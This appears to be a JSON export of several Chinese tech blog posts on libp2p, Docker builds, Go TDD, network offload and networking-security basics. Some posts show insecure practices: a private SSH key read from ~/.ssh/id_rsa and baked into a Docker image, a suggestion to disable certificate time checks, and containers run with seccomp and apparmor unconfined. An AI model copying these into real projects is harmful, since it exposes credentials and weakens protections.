初始化时手动指定只使用noise，不使用tls。\n由于tls的实现要早于noise，所以放弃tls会与只使用tls的老p2p客户端不兼容。但不兼容对我们影响不大。 noise推出后，比tls的支持范围要普及。 放弃tls可以减少一些库依赖。 方案C 修改libp2p库，比如让证书有效期为固定的前后一百年。或者修改x509的代码，使之不校验时间。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E5%8F%8C%E7%AB%AF%E6%97%B6%E9%97%B4%E4%B8%8D%E5%90%8C%E6%AD%A5%E5%AF%BC%E8%87%B4%E8%BF%9E%E6%8E%A5%E5%A4%B1%E8%B4%A5/","title":"双端时间不同步导致连接失败"},{"content":" 1 2 3 4 5 6 7 8 ARG SSH_KEY RUN umask 0077 \\ \u0026amp;\u0026amp; mkdir -p ~/.ssh \\ \u0026amp;\u0026amp; echo \u0026#34;$SSH_KEY\u0026#34; \u0026gt; ~/.ssh/id_rsa \\ \u0026amp;\u0026amp; ssh-keyscan bitbucket.org \u0026gt;\u0026gt; ~/.ssh/known_hosts \\ \u0026amp;\u0026amp; git config --global url.\u0026#34;git@bitbucket.org:\u0026#34;.insteadOf \u0026#34;https://bitbucket.org/\u0026#34; RUN go env -w GOPRIVATE=bitbucket.org/gatebackend 1 2 3 4 5 6 7 8 .PHONY: build-trace build-trace: docker buildx build --file src/trace/deploy/Dockerfile \\ --progress plain \\ --platform linux/amd64,linux/arm64 \\ --build-arg SSH_KEY=\u0026#34;$$(cat ~/.ssh/id_rsa)\u0026#34; \\ --tag nexus-dev-image.fulltrust.link/infra/trace-bot:${TRACE_VERSION} \\ . ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93%E5%AF%BC%E5%85%A5/","title":"私有仓库导入"},{"content":"私有相册 PhotoPrism 调研 安装 当前介绍方式为 docker-compose 安装:\n1 2 3 4 5 6 7 8 9 10 11 12 mkdir PhotoPrism \u0026amp;\u0026amp; cd PhotoPrism # 下载docker-compose配置文件 wget https://dl.photoprism.org/docker/docker-compose.yml # 删除不需要的配置项 vim docker-compose.yml security_opt: - seccomp:unconfined - apparmor:unconfined ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E7%A7%81%E6%9C%89%E7%9B%B8%E5%86%8C-photoprism-%E8%B0%83%E7%A0%94/","title":"私有相册 PhotoPrism 调研"},{"content":"通过 Go 学习 TDD 一、了解 TDD TDD （Test Driven Development）是敏捷开发中的一项核心实践和技术，也是一种设计方法论。\nTDD的核心思想是在开发功能代码之前，先编写单元测试用例代码，测试代码确定需要编写什么产品代码。\nTDD 工作流程 先分解任务，分离关注点（后面有演示），用实例化需求，澄清需求细节 只关注需求，程序的输入输出，不关心中间过程，写测试 用最简单的方式满足当前这个小需求即可 重构，提高代码健壮性 再次测试，补重用例，修复 Bug 提交 流程如图所示：\nTDD 的三条规则 除非是为了使一个失败的 unit test 通过，否则不允许编写任何产品代码 在一个单元测试中，只允许编写刚好能够导致失败的内容（编译错误也算失败） 只允许编写刚好能够使一个失败的 unit test 通过的产品代码 TDD 的难点 TDD 说起来十分简单，但是在落地的时候很多团队都失败了。TDD 的主要难点在以下方面：\n不会合理拆分需求 不会写有效的单元测试 不会写刚好的实现 不会重构 想要最大化利用好 TDD 开发的优势，那么就必须解决好上诉问题。\n二、Go 的 Test 入门使用 Go 语言推荐测试文件和源代码文件放在一块，测试文件以 _test.go 结尾。比如，当前 package 有 calc.go 一个文件，我们想测试 calc.go 中的 Add 和 Mul 函数，那么应该新建 calc_test.go 作为测试文件。\nexample/ |--calc.go |--calc_test.go 假使calc.go 的代码如下：\n1 2 3 4 5 6 7 8 9 package main func Add(a int, b int) int { return a + b } func Mul(a int, b int) int { return a * b } 那么测试代码 calc_test.go可以书写如下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package examples import \u0026#34;testing\u0026#34; // 测试用例名称一般命名为 Test 加上待测试的方法名 // 测试用的参数有且只有一个，在这里是 t *testing.T func TestAdd(t *testing.T) { if ans := Add(1, 2); ans != 3 { t.Errorf(\u0026#34;1 + 2 expected be 3, but %d got\u0026#34;, ans) } if ans := Add(-10, -20); ans != -30 { t.Errorf(\u0026#34;-10 + -20 expected be -30, but %d got\u0026#34;, ans) } } func TestMul(t *testing.T) { if ans := Mul(1, 2); ans != 2 { t.Errorf(\u0026#34;1 * 2 expected be 2, but %d got\u0026#34;, ans) } if ans := Mul(-10, -20); ans != 200 { t.Errorf(\u0026#34;-10 * -20 expected be 200, but %d got\u0026#34;, ans) } } 然后在命令行执行 go test：\n➜ examples go test PASS ok examples 0.100s Tops：在 go test后面加-v可以会显示每个用例的测试结果；加-cover可以查看覆盖率！\n三、TDD 开发示例 任务：统计字符串中各个字母出现的次数\n为了简化任务，我们规定字符串中只有小写字母\n目标输入1：abcdaaf\n目标输出1：a=3;b=1;c=1;d=1;f=1;\n目标输入2：aabbccdd\n目标输出2：a=2;b=2;c=2;d=2;\n1. 需求拆分 由于任务需求比较简单，我们可以不进行拆分。\n2. 编写测试代码 根据需求我们可以编写测试代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package examples import ( \u0026#34;reflect\u0026#34; \u0026#34;testing\u0026#34; ) func TestCount(t *testing.T) { cases := []struct { input, except string }{ {\u0026#34;abcdaaf\u0026#34;, \u0026#34;a=3;b=1;c=1;d=1;f=1;\u0026#34;}, {\u0026#34;aabbccdd\u0026#34;, \u0026#34;a=2;b=2;c=2;d=2;\u0026#34;}, } for _, c := range cases { t.Run(c.input, func(t *testing.T) { if output := Count(c.input); !reflect.DeepEqual(output, c.except) { t.Fatalf(\u0026#34;\u0026#39;%s\u0026#39; expected \u0026#39;%s\u0026#39;, but \u0026#39;%s\u0026#39; got\u0026#34;, c.input, c.except, output) } }) } } 3. 运行测试得到失败的结果 由于没有定义 Count 函数，因此此时运行测试会报错，运行测试结果如下：\n➜ examples go test # examples [examples.test] .\\char_count_test.go:18:17: undefined: Count FAIL examples [build failed] 4. 编写可以编译的实现 严格遵守 TDD 方法的步骤与原则，现在只需让代码可编译，这样你就可以检查测试用例能否通过。 在 char_count.go 文件下编写代码如下：\n1 2 3 4 5 package examples func Count(input string) string { return \u0026#34;\u0026#34; } 5. 运行测试得到失败的结果 在此已经定义了 Count 函数，接下来就可以进一步执行测试代码里面的具体内容，但是运行测试的结果也会错误，这是因为 Count 函数定义的问题。运行测试结果如下：\n➜ examples go test --- FAIL: TestCount (0.00s) --- FAIL: TestCount/abcdaaf (0.00s) char_count_test.go:19: \u0026#39;abcdaaf\u0026#39; expected \u0026#39;a=3;b=1;c=1;d=1;f=1;\u0026#39;, but \u0026#39;\u0026#39; got --- FAIL: TestCount/aabbccdd (0.00s) char_count_test.go:19: \u0026#39;aabbccdd\u0026#39; expected \u0026#39;a=2;b=2;c=2;d=2;\u0026#39;, but \u0026#39;\u0026#39; got FAIL exit status 1 FAIL examples 0.101s 6. 编写可以通过测试的实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package examples import \u0026#34;fmt\u0026#34; func Count(input string) string { count := make([]int, 26) for _, v := range input { count[v-96]++ } output := \u0026#34;\u0026#34; for i, v := range count { if v != 0 { output += fmt.Sprintf(\u0026#34;%s=%d;\u0026#34;, string(rune(i+96)), v) } } return output } 7. 运行测试得到成功的结果 ➜ examples go test PASS ok examples 0.103s 8. 重构 虽然代码已经通过了测试，但是其代码的规范性和简洁性还是存在很多问题，所以需要我们对代码进行重构。\n重构代码要求在不改变代码的逻辑和功能的前提下，尽可能的简化代码。简化的目的有增强代码的可读性、加快代码的执行速度等等。\n常见的简化方法就是重用代码（将频繁使用的变量、常量以及函数另外定义出来，这样就可以在各个地方调用此变量、常量、函数即可）。\n重构后的代码如下所示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package examples import \u0026#34;fmt\u0026#34; func Count(input string) string { count := make([]int, 26) for _, v := range input { count[v-\u0026#39;a\u0026#39;]++ } output := \u0026#34;\u0026#34; for i, v := range count { if v != 0 { output += fmt.Sprintf(\u0026#34;%s=%d;\u0026#34;, string(rune(i+\u0026#39;a\u0026#39;)), v) } } return output } 9. 基准测试（benchmarks） 基于TDD周期具体完成“迭代”章节的例子之后，还可以在此基础上编写基准测试。\n在 Go 中编写基准测试（benchmarks）是该语言的另一个一级特性，它与在TDD中的编写测试步骤非常相似。\n基准测试代码如下：\n1 2 3 4 5 func BenchmarkCount(b *testing.B) { for i := 0; i \u0026lt; b.N; i++ { Count(\u0026#34;abcdaaf\u0026#34;) } } 基准测试运行时，代码会运行 b.N 次，并测量需要多长时间。代码运行的次数不会对你产生影响，测试框架会选择一个它所认为的最佳值，以便让你获得更合理的结果。\n编写完测试代码后，用 go test -bench=.命令进行测试：\n➜ examples go test -bench=. goos: windows goarch: amd64 pkg: examples cpu: Intel(R) Core(TM) i5-7300HQ CPU @ 2.50GHz BenchmarkCount-4 799131 1272 ns/op PASS ok examples 1.136s ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E9%80%9A%E8%BF%87-go-%E5%AD%A6%E4%B9%A0-tdd/","title":"通过 Go 学习 TDD"},{"content":"图片在 iOS 和其他平台显示不同 经过查询，发现这是 iOS 图片解码器并发解码图片时产生的数据竞争 Bug，在新版本的 iOS 系统中已经被修复。详情可见：https://github.com/DavidBuchanan314/ambiguous-png-packer\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E5%9B%BE%E7%89%87%E5%9C%A8-ios-%E5%92%8C-%E5%85%B6%E4%BB%96%E5%B9%B3%E5%8F%B0%E6%98%BE%E7%A4%BA%E4%B8%8D%E5%90%8C/","title":"图片在 iOS 和 其他平台显示不同"},{"content":" 网络事件 造成影响 能否感知 处理 非默认路由网卡IP变更 和变更网卡相关的局域网连接断开 能 重新进行mDNS广播 默认路由网卡IP变更 1. PMP 映射失效 2. P2P 映射失效，相关连接断开 3. 局域网连接断开 4. DHT 记录失效 能 1. 重新建立PMP映射 2. 重新获取网卡接口地址和外网出口地址 3. 重新进行mDNS广播 4. 重新广播到DHT网络 路由器LAN口IP改变WAN口IP不变 1. PMP网关地址失效 能 重新获取默认路由地址，刷新缓存 路由器WAN口IP改变 1. PMP 映射失效 2. P2P 映射失效，相关连接断开 3. DHT 记录失效 不能 1. 重新建立PMP映射 2. 重新获取外网出口地址 3. 重新广播到DHT网络 network event affect can capture? process Non-default routing network card IP change The LAN connection related to changing the network card is disconnected Yes Restart mDNS broadcast Default routing network card IP change 1. PMP mapping is invalid 2. P2P mapping is invalid and related connections are disconnected 3. LAN connection is disconnected 4. DHT records are invalid Yes 1. Re-establish PMP mapping. 2. Re-obtain the network card interface address and external network egress address 3. Re-broadcast mDNS 4. Re-broadcast to the DHT network The router LAN port IP changes and the WAN port IP remains unchanged. PMP gateway address invalid Yes Retrieve gateway address Router WAN port IP changed 1. PMP mapping is invalid 2. P2P mapping is invalid and related connections are disconnected 3. DHT record is invalid No 1. Re-establish PMP mapping 2. Re-obtain the external network egress address 3. Re-broadcast to the DHT network ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E7%BD%91%E7%BB%9C%E5%8F%98%E6%9B%B4%E5%AF%B9libp2p%E7%9A%84%E5%BD%B1%E5%93%8D/","title":"网络变更对libp2p的影响"},{"content":"网络卸载技术 网络卸载（Offload）技术指的是在操作系统中将数据包的处理尽量向下层移动，避免 CPU 消耗大量的计算资源用于处理网络包。\n网络卸载技术当前主要应用于三个层面：硬件层面、驱动层面和操作系统层面。\n硬件层面 TSO / UFO TSP 全称 （TCP 分段卸载技术， TCP Segmentation Offload）；UFO 全称（UDP 分片卸载技术，UDP Fragmentation Offload）。\n开启 TSO 能力后，OS 可将一个不超过 64K 字节（包含 TCP 头部）的任意大小的TCP报文传给网卡，由网卡执行TCP分段、Checksum 计算和包头、帧头生成以及封装等工作，这样就消除了 TCP 分段工作带给 CPU 的负担。被 TCP 分段后的每个 TCP Segment，都需要封装 TCP 头，TCP 头部中有 Checksum（校验和），因此TSO通常需要 Checksum Offload 支持，即由网卡同时完成TCP校验工作。\n工作流程如图所示：\nRSC RSC 全称（接受侧合并技术，Receive Side Coalescing (RSC) or hardware LRO）。\nRSC 允许网卡在接收同一个连接的数据包时，将多个数据包拼接为一个大的网络包（不超过64kb）再传递到操作系统进行处理。\nRSC 工作流程如图所示： 网卡驱动层面 LRO/LSO LRO 全称大段接收卸载技术， Large Receive Offload；LSO 全称大段分片卸载技术，Large Segment Offload。原理和上面硬件层面的技术类似，只不过这个发生在网卡驱动层面。\n原理如图所示：\n操作系统层面 GSO/GRO GSO（Generic Segmentation Offload） 和 GRO（Generic Receive Offload），比 LSO 和 LRO 更通用。\n网卡驱动在注册时会告诉 GSO/GRO 自身支持的能力。因此 GSO/GRO 能够自动选择是交给网卡进行包处理还是自身进行包处理。\n在 Linux 环境下，可以通过 ethtool -K eth0 gso/gro off/on 进行 GSO/GRO 能力的开关。\n流程如图所示：\n实验 利用 iperf3 进行灌包测试。\n未启用 TSO ：\n带宽： 数据包总量： 数据包分析：\n启用 TSO：\n带宽： 数据包总量： 数据包分析： 实验分析 根据实验结果可以发现，未 TSO 时，TCP 连接会根据协商的 MSS=1460进行数据包构造，因此在系统网络栈中会构造大量的数据包；在启用了 TSO 之后，数据包的长度超过了协商的 MSS=1460，最大数据长度来到的 64kb。\n大包让操作系统不用去构造大量的数据包，减少了 CPU 在数据包构造上面的花销。因此会发现测试出来的带宽比未开启 TSO 时大了许多。\n参考资料：\n20140928_GSO_EuroBSDcon_2014.pdf ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E7%BD%91%E7%BB%9C%E5%8D%B8%E8%BD%BD%E6%8A%80%E6%9C%AF/","title":"网络卸载技术"},{"content":"网络安全基本知识 一、IP 1. 概念 IP是Internet Protocol（网际互连协议）的缩写，是TCP/IP体系中的网络层协议。\n现在使用的 IP 地址主要为：IPV4 和 IPV6。\n2. IPv4协议 IPv4 协议以 4字节，32比特表示，每个字节之间用 \u0026ldquo;.\u0026rdquo; 号分割，例如：“192.0.2.235”。\nIPv4 可用地址仅为 4,294,967,296个。2019年11月26日，全球所有43亿个IPv4地址已分配完毕，这意味着没有更多的IPv4地址可以分配给ISP和其他大型网络基础设施提供商。\n3. IPv6协议 IPv6 协议以 128比特表示，每个字节之间用 \u0026ldquo;:\u0026rdquo; 号分割，例如：“2031:0000:1F1F:0000:0000:0100:11A0:ADDF”。IPv6 可用地址有 2^128个。\n二、域名 1. 概念 域名（英语：Domain Name），又称网域，是由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时对计算机的定位标识（有时也指地理位置）。\n2. 作用 由于IP地址具有不方便记忆并且不能显示地址组织的名称和性质等缺点，人们设计出了域名，并通过网域名称系统（DNS，Domain Name System）来将域名和IP地址相互映射，使人更方便地访问互联网，而不用去记住能够被机器直接读取的IP地址数串。\n3. 购买 域名可用在域名提供商那里购买注册，例如腾讯云，阿里云等。\n4. 备案 根据 《互联网信息服务管理办法》 以及 《非经营性互联网信息服务备案管理办法》 ，国家对非经营性互联网信息服务实行备案制度，对经营性互联网信息服务实行许可制度。未取得许可或者未履行备案手续的，不得从事互联网信息服务。即所有对中国大陆提供服务的网站都必须先进行 ICP 备案，才可开通服务。\n通俗点儿讲所谓的“备案”类似于我们国人现实生活中的“上户口”，需要提供的信息有：姓名、家庭住址（域名）、父母（网站所有人）、联系方式等等。\n5. 二级域名与多级域名 一级域名，是由一个合法的字符串+域名后缀组成，例如：baidu.com 就是一级域名；\n二级域名：二级域名是在一级域名前面加上一个字符串，例如：baike.baidu.com；\n多级域名：多级域名就是在一级域名前加上多个字符串组成。\n三、DNS 1. 概念 域名系统（英文：Domain Name System，缩写：DNS）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。\n国内常用 DNS：114 DNS、阿里DNS、百度DNS、360 DNS和Google DNS。\n2. 本地 hosts 文件 hosts 文件是一个没有扩展名的系统文件，可以用记事本等工具打开，作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”。\n当用户访问某个域名时，系统会首先自动从 hosts 文件中寻找对应的 IP地址。如果找到，系统会根据找到的 IP进行服务器的访问，如果没有找到，则系统会再将网址提交 DNS域名解析服务器进行IP地址的解析。\n在 Windows系统中，hosts 文件路径为：C:\\windows\\system32\\drivers\\etc\\hosts 目录下；在Linux 系统中，hosts 文件路径为：/etc/hosts。\n3. A记录和CNAME A 记录：\nA (Address) 记录是用来指定主机名（或域名）对应的IP地址记录。用户可以将该域名下的网站服务器指向到自己的网页服务器(web server)上。同时也可以设置域名的子域名。\nCNAME：\nCNAME 被称为规范名字，也称别名记录。当需要将多个域名需要指向同一服务器IP时，此时我们就可以将一个域名做 A记录指向服务器IP，然后将其他的域名做别名(即CNAME)到A记录的域名上。这样用户就可以在访问不同域名时访问到同一个服务。\n4. 常见 DNS 攻击 域名劫持 通过采用黑客手段控制了域名管理密码和域名管理邮箱，然后将该域名的NS纪录指向到黑客可以控制的DNS服务器，然后通过在该DNS服务器上添加相应域名纪录，从而使网民访问该域名时，进入了黑客所指向的内容。\n缓存投毒 利用控制DNS缓存服务器，把原本准备访问某网站的用户在不知不觉中带到黑客指向的其他网站上。\nDNS劫持 DNS劫持又称域名劫持，是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则返回假的IP地址或者什么都不做使请求失去响应，其效果就是对特定的网络不能访问或访问的是假网址。\nDNS DDoS攻击 通过控制大批僵尸网络利用真实DNS协议栈发起大量域名查询请求，利用工具软件伪造源IP发送海量DNS查询，发送海量DNS查询报文导致网络带宽耗尽而无法传送正常DNS查询请求。\n四、CDN 1. 概念 CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。\n简单来说，CDN就是采用更多的缓存服务器（CDN边缘节点），布放在用户访问相对集中的地区或网络中。当用户访问网站时，利用全局负载技术，将用户的访问指向距离最近的缓存服务器上，由缓存服务器响应用户请求（类似于京东这样电商的本地仓库）。\n2. CDN的实现 网站运行商在 CDN运营商那里购买 CDN服务时，会得到一个专有的 CDN加速 DNS 服务器地址，网站运营商将自己的域名解析到这个专有 DNS 服务器上。\n当用户请求目标网站时，本地 DNS 会返回专有 DNS服务器的地址，域名解析服务交给这个专有 DNS 服务器。CDN 运营商的专有 DNS 服务器会根据用户的 IP 地址得到用户所在的地理位置，再返回距离用户最近的 CDN服务器的地址。于是用户就会去返回的这个 CDN 服务器请求资源，从而实现用户访问的加速。\n3. CDN 检测 由于CDN 的机制，会对我们进行渗透测试时造成困难。因此检测网站是否使用了 CDN对我们而言是一件十分重要的事情。\n根据 CDN的原理，我们可以在不同地区访问网站，看看解析得到的IP是否是同一个，如果不是，那么该网站就可能使用了 CDN服务。\n我们可以通过各种在线服务平台对网站进行CDN检测，例如：Ping.cn-全国多地区网络节点在线ping检测平台等。\n五、URL + URN = URI 1. 概念 URL = Uniform Resource Locator 统一资源定位符，一种定位资源的主要访问机制的字符串；\nURN = Uniform Resource Name 统一资源名称，通过特定命名空间中的唯一名称或ID来标识资源；\nURI = Uniform Resource Identifier 统一资源标志符，用来标识抽象或物理资源的一个紧凑字符串。\n2. 三者之间的区别 URL 标准格式：\nprotocol :// hostname[:port] / path / [;parameters][?query]#fragment\n**protocol：**协议； **hostname：**主机名； **port：**端口； **path：**路径； **parameters：**参数； query：查询； **fragment：**参数片段。 举例：\nhttp://127.0.0.1:8000/file/1.txt\nURI 标准格式：\nscheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]\n**user：**用户信息 举例：\nhierarchical part ┌───────────────────┴─────────────────────┐ authority path ┌───────────────┴───────────────┐┌───┴────┐ abc://username:password@example.com:123/path/data?key=value\u0026amp;key2=value2#fragid1 └┬┘ └───────┬───────┘ └────┬────┘ └┬┘ └─────────┬─────────┘ └──┬──┘ scheme user information host port query fragment\nURN 举例：\nurn:example:mammal:monotreme:echidna └┬┘ └──────────────┬───────────────┘ scheme path\n六、HTTP 1. 概念 超文本传输协议（Hypertext Transfer Protocol，HTTP）是一个简单的请求-响应协议，它通常运行在TCP之上。它指定了客户端可能发送给服务器什么样的消息以及得到什么样的响应。请求和响应消息的头以ASCII形式给出。\n2. 简介 超文本传输协议（Hypertext Transfer Protocol，HTTP）是一个简单的请求-响应协议，它通常运行在TCP之上。它指定了客户端可能发送给服务器什么样的消息以及得到什么样的响应 现在主要应用 http1.1 协议 http是无状态协议，不会保存多次请求之间的关系，使用cookie做状态管理 持久连接节省通信量（HTTP1.1和部分HTTP1.0） 通过请求方法告知服务器意图，get,post等 3. HTTP 请求 请求报文 HTTP 的请求报文包含三个部分：请求行 + 请求头 + 数据体。请求头与数据体之间由空行隔开，每一个请求头之间需要换行。\n通过浏览器的 Network 选项，我们可以看到我们在请求网站时发送的 HTTP 请求头的内容：\n1 2 3 4 5 6 7 8 9 10 GET / HTTP/1.1 Host: www.example.com Connection: keep-alive Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.51 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 HTTP 请求报文的请求首行由：请求方式 + 请求地址 + 请求协议组成。\nHTTP的头信息包括通用头、请求头、响应头和实体头四个部分。每个头域由一个域名，冒号（:）和域值三部分组成：\n通用头标：即可用于请求，也可用于响应，是作为一个整体而不是特定资源与事务相关联； 请求头标：允许客户端传递关于自身的信息和希望的响应形式； 响应头标：服务器和于传递自身信息的响应； 实体头标：定义被传送资源的信息。即可用于请求，也可用于响应； HTTP 请求方法 序号 方法 描述 1 GET 请求指定的页面信息，并返回实体主体； 2 HEAD 类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头；编写扫描工具时使用这个方法效率最高。 3 POST 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和/或已有资源的修改； 4 PUT 从客户端向服务器传送的数据取代指定的文档的内容； 5 DELETE 请求服务器删除指定的页面； 6 CONNECT HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器； 7 OPTIONS 允许客户端查看服务器的性能； 8 TRACE 回显服务器收到的请求，主要用于测试或诊断； 9 PATCH 是对 PUT 方法的补充，用来对已知资源进行局部更新 。 HTTP 请求头 Header 解释 示例 Accept 指定客户端能够接收的内容类型 Accept: text/plain, text/html Accept-Charset 浏览器可以接受的字符编码集。 Accept-Charset: iso-8859-5 Accept-Encoding 指定浏览器可以支持的web服务器返回内容压缩编码类型。 Accept-Encoding: compress, gzip Accept-Language 浏览器可接受的语言 Accept-Language: en,zh Accept-Ranges 可以请求网页实体的一个或者多个子范围字段 Accept-Ranges: bytes Authorization HTTP授权的授权证书 Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ== Cache-Control 指定请求和响应遵循的缓存机制 Cache-Control: no-cache Connection 表示是否需要持久连接。（HTTP 1.1默认进行持久连接） Connection: close Cookie HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。 Cookie: $Version=1; Skin=new; Content-Length 请求的内容长度 Content-Length: 348 Content-Type 请求的与实体对应的MIME信息 Content-Type: application/x-www-form-urlencoded Date 请求发送的日期和时间 Date: Tue, 15 Nov 2010 08:12:31 GMT Expect 请求的特定的服务器行为 Expect: 100-continue From 发出请求的用户的Email From: user@email.com Host 指定请求的服务器的域名和端口号 Host: www.zcmhi.com If-Match 只有请求内容与实体相匹配才有效 If-Match: “737060cd8c284d8af7ad3082f209582d” If-Modified-Since 如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码 If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT If-None-Match 如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变 If-None-Match: “737060cd8c284d8af7ad3082f209582d” If-Range 如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag If-Range: “737060cd8c284d8af7ad3082f209582d” If-Unmodified-Since 只在实体在指定时间之后未被修改才请求成功 If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT Max-Forwards 限制信息通过代理和网关传送的时间 Max-Forwards: 10 Pragma 用来包含实现特定的指令 Pragma: no-cache Proxy-Authorization 连接到代理的授权证书 Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ== Range 只请求实体的一部分，指定范围 Range: bytes=500-999 Referer 先前网页的地址，当前请求网页紧随其后,即来路 Referer: http://www.zcmhi.com/archives/71.html TE 客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息 TE: trailers,deflate;q=0.5 Upgrade 向服务器指定某种传输协议以便服务器进行转换（如果支持） Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11 User-Agent User-Agent的内容包含发出请求的用户信息 User-Agent: Mozilla/5.0 (Linux; X11) Via 通知中间网关或代理服务器地址，通信协议 Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1) Warning 关于消息实体的警告信息 Warn: 199 Miscellaneous warning 3. HTTP 响应 响应报文与请求报文一样，由三个部分组成(响应行，响应头，响应体)。响应头与响应体之间由空行隔开，每一个请求头之间需要换行。\n浏览器捕捉到的响应头：\n1 2 3 4 5 6 7 8 9 10 11 12 13 HTTP/1.1 200 OK Content-Encoding: gzip Age: 170477 Cache-Control: max-age=604800 Content-Type: text/html; charset=UTF-8 Date: Sat, 01 May 2021 12:58:12 GMT Etag: \u0026#34;3147526947+ident+gzip\u0026#34; Expires: Sat, 08 May 2021 12:58:12 GMT Last-Modified: Thu, 17 Oct 2019 07:18:26 GMT Server: ECS (sab/5695) Vary: Accept-Encoding X-Cache: HIT Content-Length: 648 HTTP 响应码 分类 分类描述 1** 信息，服务器收到请求，需要请求者继续执行操作 2** 成功，操作被成功接收并处理 3** 重定向，需要进一步的操作以完成请求 4** 客户端错误，请求包含语法错误或无法完成请求 5** 服务器错误，服务器在处理请求的过程中发生了错误 HTTP 响应头 响应头 说明 示例 Access-Control-Allow-Origin 指定哪些网站可以跨域源资源共享 Access-Control-Allow-Origin: * Accept-Patch 指定服务器所支持的文档补丁格式 Accept-Patch: text/example;charset=utf-8 Accept-Ranges 服务器所支持的内容范围 Accept-Ranges: bytes Age 响应对象在代理缓存中存在的时间，以秒为单位 Age: 12 Allow 对于特定资源的有效动作; Allow: GET, HEAD Cache-Control 通知从服务器到客户端内的所有缓存机制，表示它们是否可以缓存这个对象及缓存有效时间。其单位为秒 Cache-Control: max-age=3600 Connection 针对该连接所预期的选项 Connection: close Content-Disposition 对已知MIME类型资源的描述，浏览器可以根据这个响应头决定是对返回资源的动作，如：将其下载或是打开。 Content-Disposition: attachment; filename=\u0026ldquo;fname.ext\u0026rdquo; Content-Encoding 响应资源所使用的编码类型。 Content-Encoding: gzip Content-Language 响就内容所使用的语言 Content-Language: zh-cn Content-Length 响应消息体的长度，用8进制字节表示 Content-Length: 348 Content-Location 所返回的数据的一个候选位置 Content-Location: /index.htm Content-MD5 响应内容的二进制 MD5 散列值，以 Base64 方式编码 Content-MD5: IDK0iSsgSW50ZWd0DiJUi== Content-Range 如果是响应部分消息，表示属于完整消息的哪个部分 Content-Range: bytes 21010-47021/47022 Content-Type 当前内容的MIME类型 Content-Type: text/html; charset=utf-8 Date 此条消息被发送时的日期和时间(以RFC 7231中定义的\u0026quot;HTTP日期\u0026quot;格式来表示) Date: Tue, 15 Nov 1994 08:12:31 GMT ETag 对于某个资源的某个特定版本的一个标识符，通常是一个 消息散列 ETag: \u0026ldquo;737060cd8c284d8af7ad3082f209582d\u0026rdquo; Expires 指定一个日期/时间，超过该时间则认为此回应已经过期 Expires: Thu, 01 Dec 1994 16:00:00 GMT Last-Modified 所请求的对象的最后修改日期(按照 RFC 7231 中定义的“超文本传输协议日期”格式来表示) Last-Modified: Dec, 26 Dec 2015 17:30:00 GMT Link 用来表示与另一个资源之间的类型关系，此类型关系是在RFC 5988中定义 Link: ; rel=\u0026ldquo;alternate\u0026rdquo; Location 用于在进行重定向，或在创建了某个新资源时使用。 Location: http://www.itbilu.com/nodejs P3P P3P策略相关设置 P3P: CP=\u0026ldquo;This is not a P3P policy! Pragma 与具体的实现相关，这些响应头可能在请求/回应链中的不同时候产生不同的效果 Pragma: no-cache Proxy-Authenticate 要求在访问代理时提供身份认证信息。 Proxy-Authenticate: Basic Public-Key-Pins 用于防止中间攻击，声明网站认证中传输层安全协议的证书散列值 Public-Key-Pins: max-age=2592000; pin-sha256=\u0026quot;……\u0026rdquo;; Refresh 用于重定向，或者当一个新的资源被创建时。默认会在5秒后刷新重定向。 Refresh: 5; url=http://itbilu.com Retry-After 如果某个实体临时不可用，那么此协议头用于告知客户端稍后重试。其值可以是一个特定的时间段(以秒为单位)或一个超文本传输协议日期。 示例1:Retry-After: 120示例2: Retry-After: Dec, 26 Dec 2015 17:30:00 GMT Server 服务器的名称 Server: nginx/1.6.3 Set-Cookie 设置HTTP 